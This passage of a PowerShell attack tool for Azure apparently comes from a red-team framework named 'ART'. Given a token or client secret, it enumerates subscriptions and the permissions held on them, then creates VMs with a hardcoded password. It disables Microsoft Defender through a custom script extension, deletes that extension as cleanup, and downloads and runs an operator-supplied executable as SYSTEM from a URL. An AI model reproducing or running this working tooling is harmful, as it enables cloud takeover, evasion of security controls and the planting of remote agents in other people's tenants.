    $extUri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VMName/extensions/ART-Phase2`?api-version=2024-03-01"
    $body = @{
        location   = $Location
        properties = @{
            publisher  = "Microsoft.Compute"
            type = "CustomScriptExtension"
            typeHandlerVersion = "1.10"
            autoUpgradeMinorVersion = $true
            settings = @{
                commandToExecute = "powershell -EncodedCommand $encoded"
            }
        }
    } | ConvertTo-Json -Depth 10

    try {
        $null = Invoke-SmartRequest -Method "PUT" -Uri $extUri -Headers $Headers -Body $body -ContentType "application/json"
        Write-Host "      [+] Agent downloaded and executed" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "      [-] Phase 2 failed: $_" -ForegroundColor Red
        return $false
    }
}

#######################################################################################################
#######################################################################################################

function Show-DeploymentTargets {
    param([array]$Targets)

    write-host " = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =" -ForegroundColor DarkYellow 
    Write-Host "   # Id     # Subscription     # Resource Group             # Location        # Permission" -ForegroundColor White
    write-host " "
        

    for ($i = 0; $i -lt $Targets.Count; $i++) {
        $t = $Targets[$i]
        $num  = ($i + 1).ToString().PadRight(4)
        $sub  = $t.SubName.PadRight(26).Substring(0, [Math]::Min(26, $t.SubName.Length))
        $rg   = $t.ResourceGroup.PadRight(23).Substring(0, [Math]::Min(23, $t.ResourceGroup.Length))
        $loc  = $t.Location.PadRight(15).Substring(0, [Math]::Min(15, $t.Location.Length))
        $perm = $t.Level
        $note = if ($t.NeedsExistingNet) { " (existing VNet)" } else { "" }

        

        $color = if ($perm -match "Owner|Contributor") {
             "Green" 
        } else {
             "Yellow" 
        }
		
		
        write-host "  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - " -ForegroundColor DarkYellow 
        Write-Host "    $num      $sub        $rg             $loc              " -NoNewline -ForegroundColor Gray
        Write-Host "$perm$note" -ForegroundColor $color
        
    }
    write-host " = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =" -ForegroundColor DarkYellow 
    Write-Host ""
}


####################################

#######################################################################################################
#######################################################################################################

function main {
    param (
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$IdentityARM,
        [string]$TenantName
    )

    if (-not $TenantName) {
         Write-Host "[-] Must specify TenantName" -ForegroundColor Red
         return 
        }

    
    $global:TenantID = Get-DomainName -DomainName $TenantName

    if (-not $global:TenantID) {
         return 
    }

    if ($IdentityARM) {
         Invoke-GetTokens -ARMToken $IdentityARM | Out-Null
    }

    elseif ($ClientID -and $ClientSecret) {
         Invoke-GetTokens -DomainName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret | Out-Null 
    }

    else {
         Invoke-GetTokens -DomainName $TenantName | Out-Null 
    }

    if (-not $global:AccessToken) {
        Write-Host "[-] No token." -ForegroundColor Red
        return 
    }


    $myIP = GetIP

    if ($myIP) {
         Write-Host "[#] My IP: $myIP" -ForegroundColor DarkYellow 
    }

    else { Write-Host "[-] Could not detect IP. NSG will not restrict RDP." -ForegroundColor Yellow; $myIP = "*" }

    $headers = Get-AuthHeaders

   
    Write-Host "`n[*] Enumerating Subscriptions..." -ForegroundColor Cyan

    $subResp = Invoke-SmartRequest -Uri "https://management.azure.com/subscriptions?api-version=2021-01-01" -Headers $headers

    if (-not $subResp -or -not $subResp.value) {
         Write-Host "[-] No subscriptions." -ForegroundColor Red
         return 
    }

    $subs = @($subResp.value | ForEach-Object {
        [PSCustomObject]@{ DisplayName = $_.displayName; SubscriptionId = $_.subscriptionId; State = $_.state }
    })

    Write-Host "[+] Found $($subs.Count) subscription(s)" -ForegroundColor Green

    
    Write-Host "`n[*] Mapping permissions and discovering resource groups..." -ForegroundColor Cyan
    $deployTargets = @()

    foreach ($sub in $subs) {
        if ($sub.State -ne "Enabled") { continue }
        Write-Host "  [>] $($sub.DisplayName)..." -ForegroundColor DarkGray -NoNewline

        $subPerm = Get-SubscriptionPermLevel -SubscriptionId $sub.SubscriptionId -Headers $headers
        Write-Host " $($subPerm.Level)" -ForegroundColor $(if ($subPerm.CanCreateVM) { "Green" } else { "Gray" })

        $rgResp = Invoke-SmartRequest -Uri "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resourcegroups?api-version=2021-04-01" -Headers $headers

        if (-not $rgResp -or -not $rgResp.value) {
             continue 
        }

        foreach ($rg in $rgResp.value) {
            $rgPerm = $null
            if ($subPerm.CanCreateVM) {
                $rgPerm = $subPerm
            } else {
                $rgPerm = Get-ResourceGroupPermLevel -SubscriptionId $sub.SubscriptionId -ResourceGroup $rg.name -Headers $headers
            }

            if ($rgPerm.CanCreateVM) {
                $deployTargets += [PSCustomObject]@{
                    SubName          = $sub.DisplayName
                    SubId            = $sub.SubscriptionId
                    ResourceGroup    = $rg.name
                    Location         = $rg.location
                    Level            = $rgPerm.Level
                    NeedsExistingNet = $rgPerm.NeedsExistingNet
                }
            }
        }
    }

    if ($deployTargets.Count -eq 0) {
        Write-Host "`n[-] No resource groups with VM creation permissions found." -ForegroundColor Red
        return
    }

    Write-Host "[+] Found $($deployTargets.Count) deployment target(s)" -ForegroundColor Green

    
    while ($true) {
        Show-DeploymentTargets -Targets $deployTargets

        $choice = Read-Host "Select target # (or Q to quit)"
        if ($choice -match "^[Qq]$") {
             Write-Host "`n[*] Yalla Bye!." -ForegroundColor Cyan
             break 
        }

        $idx = [int]$choice - 1

        if ($idx -lt 0 -or $idx -ge $deployTargets.Count) {
             Write-Host "[!] Invalid." -ForegroundColor Red
             continue 
        }

        $target = $deployTargets[$idx]

        Write-Host "`n[*] Selected: $($target.ResourceGroup) [$($target.SubName)]" -ForegroundColor Cyan

        # VM Count
        $vmCountStr = Read-Host "[?] How many VMs to create? (default: 1)"
        $vmCount = if ([string]::IsNullOrWhiteSpace($vmCountStr)) { 1 } else { [int]$vmCountStr }

        # VM Names
        $vmNames = @()
        for ($i = 1; $i -le $vmCount; $i++) {
            $nameInput = Read-Host "[?] Name for VM $i (default: ART-VM-$i)"
            $name = if ([string]::IsNullOrWhiteSpace($nameInput)) { "ART-VM-$i" } else { $nameInput }
            $vmNames += $name
        }

        # Location override
        $locInput = Read-Host "[?] Location (default: $($target.Location))"
        $location = if ([string]::IsNullOrWhiteSpace($locInput)) {
                        $target.Location
                    } else {
                        $locInput 
                    }

        $location = ($location -replace '\s', '').ToLower()

        # VM Size
        $sizeInput = Read-Host "[?] VM Size (default: Standard_D2s_v3)"
        $vmSize = if ([string]::IsNullOrWhiteSpace($sizeInput)) {
             "Standard_D2s_v3" 
            } else {
                 $sizeInput 
            }

        # PE Configuration
        Write-Host ""
        $peUrl = Read-Host "[?] PE download URL (leave empty to skip agent setup)"
        $peFileName = ""
        $peArgs = ""
        if (-not [string]::IsNullOrWhiteSpace($peUrl)) {
            $peFileName = ($peUrl -split '/')[-1]

            $fnInput = Read-Host "[?] PE filename on disk (default: $peFileName)"

            if (-not [string]::IsNullOrWhiteSpace($fnInput)) {
                 $peFileName = $fnInput 
            }

            $argsInput = Read-Host "[?] PE arguments (leave empty for none)"

            if (-not [string]::IsNullOrWhiteSpace($argsInput)) {
                 $peArgs = $argsInput 
            }
        }

        $deployAgent = -not [string]::IsNullOrWhiteSpace($peUrl)

        # Confirm
        write-host ""
        write-host " The Plan:"
        write-host " - - - - - -"
        Write-Host "    [*] Subscription:  $($target.SubName)" -ForegroundColor White
        Write-Host "    [*] Resource Group: $($target.ResourceGroup)" -ForegroundColor White
        Write-Host "    [*] Location:       $location" -ForegroundColor White
        Write-Host "    [*] VM Count:       $vmCount" -ForegroundColor White
        Write-Host "    [*] VM Names:       $($vmNames -join ', ')" -ForegroundColor White
        Write-Host "    [*] VM Size:        $vmSize" -ForegroundColor White
        Write-Host "    [*] OS:             Windows Server 2022 Datacenter" -ForegroundColor White
        Write-Host "    [*] Username:       ART" -ForegroundColor White
        Write-Host "    [*] Password:       ArtRole123123!" -ForegroundColor White
        Write-Host "    [*] RDP Access:     $myIP only" -ForegroundColor White
        write-host " - - - - - - - - - - - - "
        if ($deployAgent) {
            Write-Host "    [^] Agent URL: $peUrl" -ForegroundColor Yellow
            Write-Host "    [^] Agent File: $peFileName" -ForegroundColor Yellow

            if ($peArgs) {
                 Write-Host "    [^] Agent Args: $peArgs" -ForegroundColor Yellow 
            }
            Write-Host "    [^] Defender Disable! " -ForegroundColor Yellow
        } else {
            Write-Host "   Agent:          None (clean VM)" -ForegroundColor DarkGray
        }
        
        write-host " "
        $confirm = Read-Host "`n[?] So... to Deploy? :)   (Y/N)"

        if ($confirm -notmatch "^[Yy]") {
             Write-Host "[!] Cancelled." -ForegroundColor Yellow
             continue 
            }

        $subId = $target.SubId
        $rg = $target.ResourceGroup
        $nsgName  = "ART-NSG-$(Get-Random -Maximum 9999)"
        $vnetName = "ART-VNet-$(Get-Random -Maximum 9999)"
        $subnetName = "ART-Subnet"

        Write-Host "`n[*] Starting deployment..." -ForegroundColor Cyan


        

        $nsgId = New-NSG -SubId $subId -RG $rg -Name $nsgName -Location $location -MyIP $myIP -Headers $headers
        if (-not $nsgId) { 
            Write-Host "    [!] NSG creation failed (insufficient permissions). VMs will be created WITHOUT NSG." -ForegroundColor Yellow
            Write-Host "    [!] WARNING: All inbound ports will be open!" -ForegroundColor Red
        }

        # Create VNet + Subnet
        $subnetId = New-VNet -SubId $subId -RG $rg -Name $vnetName -Location $location -SubnetName $subnetName -NSGId $nsgId -Headers $headers
        if (-not $subnetId) { 
            Write-Host "    [!] VNet creation failed. Looking for existing VNets..." -ForegroundColor Yellow

            # Fallback: find existing VNets in the RG
            $existingVnets = @()
            try {
                $vnetResp = Invoke-SmartRequest -Uri "https://management.azure.com/subscriptions/$subId/resourceGroups/$rg/providers/Microsoft.Network/virtualNetworks?api-version=2023-11-01" -Headers $headers
                if ($vnetResp -and $vnetResp.value) {
					$existingVnets = $vnetResp.value 
				}
            } catch { }

            if ($existingVnets.Count -eq 0) {
                Write-Host "    [-] No existing VNets found. Cannot deploy VMs." -ForegroundColor Red
                continue
            }

            Write-Host "    [+] Found existing VNet(s):" -ForegroundColor Green
            for ($v = 0; $v -lt $existingVnets.Count; $v++) {
                $subs = ($existingVnets[$v].properties.subnets | ForEach-Object { $_.name }) -join ", "
                Write-Host "      $($v+1)) $($existingVnets[$v].name) [$subs]" -ForegroundColor White
            }
            $vChoice = Read-Host "    Select VNet #"
            $selVnet = $existingVnets[[int]$vChoice - 1]

            # Pick subnet
            $selSubnets = $selVnet.properties.subnets
            if ($selSubnets.Count -eq 1) {
                $subnetId = $selSubnets[0].id
                Write-Host "    [*] Using subnet: $($selSubnets[0].name)" -ForegroundColor DarkGray
            } else {
                for ($s = 0; $s -lt $selSubnets.Count; $s++) {
                    Write-Host "      $($s+1)) $($selSubnets[$s].name) ($($selSubnets[$s].properties.addressPrefix))" -ForegroundColor White
                }
                $sChoice = Read-Host "    Select Subnet #"
                $subnetId = $selSubnets[[int]$sChoice - 1].id
            }

            $location = $selVnet.location
            Write-Host "    [+] Using existing network infrastructure" -ForegroundColor Green
        }

        $needsExistingNet = $target.NeedsExistingNet

        if ($needsExistingNet) {
            
            $netResources = Find-ExistingNetworkResources -SubId $subId -RG $rg -Headers $headers
            if (-not $netResources) { continue }

            $subnetId = $netResources.SubnetId
            $nsgId = $netResources.NSGId
            $location = $netResources.Location

           
            Write-Host "    [!] VM Contributor: VMs will have private IPs only (no Public IP)" -ForegroundColor Yellow
        }
        else {
            
            $nsgId = New-NSG -SubId $subId -RG $rg -Name $nsgName -Location $location -MyIP $myIP -Headers $headers
            if (-not $nsgId) { continue }

            $subnetId = New-VNet -SubId $subId -RG $rg -Name $vnetName -Location $location -SubnetName $subnetName -NSGId $nsgId -Headers $headers
            if (-not $subnetId) { continue }
        }

        $deployedVMs = @()
        foreach ($vmName in $vmNames) {
           
            # Public IP
            $pipName = "$vmName-pip"
            Write-Host "      [*] Creating Public IP: $pipName" -ForegroundColor DarkGray

            $pipId = New-PublicIP -SubId $subId -RG $rg -Name $pipName -Location $location -Headers $headers

            # NIC
            $nicName = "$vmName-nic"
            Write-Host "      [*] Creating NIC: $nicName" -ForegroundColor DarkGray
            $nicId = New-NIC -SubId $subId -RG $rg -Name $nicName -Location $location -SubnetId $subnetId -PIPId $pipId -NSGId $nsgId -Headers $headers

            if (-not $nicId) {
                 Write-Host "      [-] NIC failed. Skipping VM." -ForegroundColor Red
                 continue 
            }

            Write-Host "      [*] Waiting for NIC provisioning..." -ForegroundColor DarkGray
            Start-Sleep -Seconds 10

            # VM
            $vmResp = New-VM -SubId $subId -RG $rg -VMName $vmName -Location $location -NICId $nicId -Username "ART" -Password "ArtRole123123!" -VMSize $vmSize -Headers $headers

            if ($vmResp -and $vmResp -ne "QUOTA_EXCEEDED" -and $vmResp -ne "SKU_ERROR") {
                $deployedVMs += [PSCustomObject]@{
                    Name = $vmName
                    PIPName = $pipName
                    NICName = $nicName
                    Status  = "Deploying"
                }
            }
            else {
                if ($vmResp -eq "QUOTA_EXCEEDED") {
                    Write-Host "`n    [!] Core quota exceeded. Cannot create more VMs in this region." -ForegroundColor Red
                    Write-Host "    [!] Successfully started: $($deployedVMs.Count) / $vmCount VMs" -ForegroundColor Yellow
                    break
                }
                if ($vmResp -eq "SKU_ERROR") {
                    Write-Host "`n    [!] VM size not available. All remaining VMs will fail too." -ForegroundColor Red
                    break
                }
                # Other failure
                if ($deployedVMs.Count -eq 0) {
                    Write-Host "`n    [!] First VM failed." -ForegroundColor Yellow
                    $cont = Read-Host "    Continue with remaining VMs? (Y/N)"
                    if ($cont -notmatch "^[Yy]") {
                         break 
                    }
                }
            }
        }

        if ($deployedVMs.Count -gt 0) {
            Write-Host "`n[*] Waiting for VMs to provision (60 sec)..." -ForegroundColor DarkGray
            Start-Sleep -Seconds 60

            if ($deployAgent) {
                foreach ($vm in $deployedVMs) {
                    Install-Phase1-DisableDefender -SubId $subId -RG $rg -VMName $vm.Name -Location $location -PEFileName $peFileName -Headers $headers | Out-Null
                }

                Write-Host "`n[*] All Phase 1 Done.. Waiting for all VMs to restart (120 sec)..."
                Start-Sleep -Seconds 120
                foreach ($vm in $deployedVMs) {

                    $delUri = "https://management.azure.com/subscriptions/$subId/resourceGroups/$rg/providers/Microsoft.Compute/virtualMachines/$($vm.Name)/extensions/ART-Phase1`?api-version=2024-03-01"
                    try {
                         $null = Invoke-SmartRequest -Method "DELETE" -Uri $delUri -Headers $headers 
                    } catch {

                    }
                }
                Write-Host "[*] Waiting for extension cleanup (45 sec)..." -ForegroundColor DarkGray
                Start-Sleep -Seconds 45

                Write-Host "[*] Phase 2: Execution on $($deployedVMs.Count) VMs..." -ForegroundColor Cyan

                foreach ($vm in $deployedVMs) {
                    Install-Phase2-DeployAgent -SubId $subId -RG $rg -VMName $vm.Name -Location $location -PEUrl $peUrl -PEFileName $peFileName -PEArgs $peArgs -Headers $headers | Out-Null
                }

                Write-Host "`n[*] Deployed" -ForegroundColor Green
                write-host " "
                
                Start-Sleep -Seconds 15
            }

            write-host " "
            Write-Host "  $($deployedVMs.Count) / $vmCount VMs deployed" -ForegroundColor $(if ($deployedVMs.Count -eq $vmCount) {
                                                                                                "Green" 
                                                                                            } else { 
                                                                                                "Yellow" 
                                                                                            }
                                                                                        )



            foreach ($vm in $deployedVMs) {

                $publicIP = Get-VMPublicIP -SubId $subId -RG $rg -PIPName $vm.PIPName -Headers $headers
                write-host " = = = = = = = =  = = = = = = = = = = = = = = = = = = = = = = = =  = = = = = = = = "
                Write-Host "    [+] VM:       $($vm.Name)" -ForegroundColor White
                Write-Host "    [+] IP:       $publicIP" -ForegroundColor Cyan
                Write-Host "    [+] RDP:      mstsc /v:$publicIP" -ForegroundColor Yellow
                Write-Host "    [+] User:     ART" -ForegroundColor White
                Write-Host "    [+] Password: ArtRole123123!" -ForegroundColor White               
            }

            write-host " - - - - - - - - - - - - - - - - - - - - -"
            Write-Host "    [+] NSG:     $nsgName (RDP from $myIP only)" -ForegroundColor DarkGray
            Write-Host "    [+] VNet:    $vnetName" -ForegroundColor DarkGray
            write-host " - - - - - - - - - - - - - - - - - - - - -"
            write-host " "

            if ($deployAgent) {
                Write-Host "    [!!!] Defender disabled + agent deployed on all VMs" -ForegroundColor Green
                Write-Host "    [!!!] Agent running as SYSTEM: $peFileName" -ForegroundColor Cyan
                write-host " "
            }
        }
        else {
            Write-Host "`n[-] No VMs were deployed." -ForegroundColor Red
        }
    }
}

main -ClientID $ClientID -ClientSecret $ClientSecret -IdentityARM $IdentityARM -TenantName $TenantName

}
